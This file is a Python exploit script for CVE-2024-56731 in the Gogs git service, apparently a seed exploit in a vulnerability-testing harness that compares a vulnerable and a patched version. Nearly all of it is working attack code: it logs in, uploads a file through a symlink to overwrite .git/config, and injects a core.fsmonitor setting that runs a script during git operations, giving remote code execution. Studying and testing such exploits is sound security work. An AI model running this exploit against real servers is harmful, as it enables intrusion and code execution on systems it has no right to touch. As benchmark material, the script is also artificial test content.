#!/usr/bin/env python3
"""[GIVEN] CVE-2024-56731 seed exploit: overwrite .git/config through file
symlink via the file UPLOAD endpoint.

UploadRepoFiles uses com.Copy(tmpPath, targetPath) to copy uploaded files to
the repo working tree. On V0 (0.13.2), there is NO IsSymlink check before
com.Copy, so uploading a file named 'link' overwrites the symlink target
(.git/config) with the uploaded content. On V1 (0.13.3), an IsSymlink check
was added that BLOCKS uploads that would overwrite symlinks.

The injected config sets core.fsmonitor to a pre-created canary script
(/data/pcb/fsmon.sh) that reads the planted PCB_FLAG.

Mechanism: file-write through file symlink (link -> .git/config) via upload.
Canary: rce-oob (core.fsmonitor reads planted flag file).
"""

import re
import time

import requests

from gogs_util import (
    ADMIN_USER,
    ADMIN_PASS,
    REPO_NAME,
    base_url,
    clear_flag_result,
    malicious_config,
    read_flag_result,
)


def run(*, version: str = "v0") -> str:
    """Run the CVE-2024-56731 exploit via file upload. Returns observable result."""
    url = base_url(version)
    clear_flag_result(version)

    s = requests.Session()

    # 1. Login
    login_page = s.get(f"{url}/user/login", timeout=10)
    csrf = _extract_csrf(login_page.text)
    s.post(
        f"{url}/user/login",
        data={"_csrf": csrf, "user_name": ADMIN_USER, "password": ADMIN_PASS},
        timeout=10,
        allow_redirects=True,
    )

    # 2. Navigate to the upload page (GET to get CSRF)
    upload_page_url = f"{url}/{ADMIN_USER}/{REPO_NAME}/_upload/master/"
    r = s.get(upload_page_url, timeout=10)
    if r.status_code != 200:
        return f"upload_page_failed:{r.status_code}"
    csrf = _extract_csrf(r.text)

    # 3. Upload the file via the dropzone endpoint
    config_content = malicious_config()
    files = {"file": ("link", config_content.encode(), "application/octet-stream")}
    upload_r = s.post(
        f"{url}/{ADMIN_USER}/{REPO_NAME}/upload-file",
        files=files,
        data={"_csrf": csrf},
        timeout=15,
    )

    if upload_r.status_code != 200:
        return f"file_upload_failed:{upload_r.status_code}"

    # Parse the upload UUID from the response
    try:
        upload_uuid = upload_r.json().get("uuid", "")
    except Exception:
        return f"upload_uuid_parse_failed:{upload_r.text[:100]}"

    if not upload_uuid:
        return "upload_uuid_empty"

    # 4. Commit the upload to the repo root directory
    # Need fresh CSRF
    r = s.get(upload_page_url, timeout=10)
    csrf = _extract_csrf(r.text)

    commit_data = {
        "_csrf": csrf,
        "tree_path": "",
        "commit_summary": "upload canary",
        "commit_message": "",
        "commit_choice": "direct",
        "new_branch_name": "",
        "files": upload_uuid,
    }
    r = s.post(upload_page_url, data=commit_data, timeout=30, allow_redirects=True)

    # The upload may return 200 even on error (form re-rendered with flash).
    # On success, the write to .git/config triggers fsmonitor during git add.
    upload_status = r.status_code

    # 5. Wait for fsmonitor to trigger during git add/commit
    time.sleep(3)

    # 6. Read the flag result (check regardless of HTTP status)
    result = read_flag_result(version)
    if result:
        return result

    # On V1, the upload is blocked by IsSymlink check before any write.
    return f"no_flag_detected:http_{upload_status}"


def _extract_csrf(html: str) -> str:
    m = re.search(r'name="_csrf"\s+(?:content|value)="([^"]+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'_csrf.*?content="([^"]+)"', html)
    if m:
        return m.group(1)
    return ""


if __name__ == "__main__":
    import json
    print(json.dumps({"type": "web_editor", "probe_id": "cve-2024-56731-upload"}))
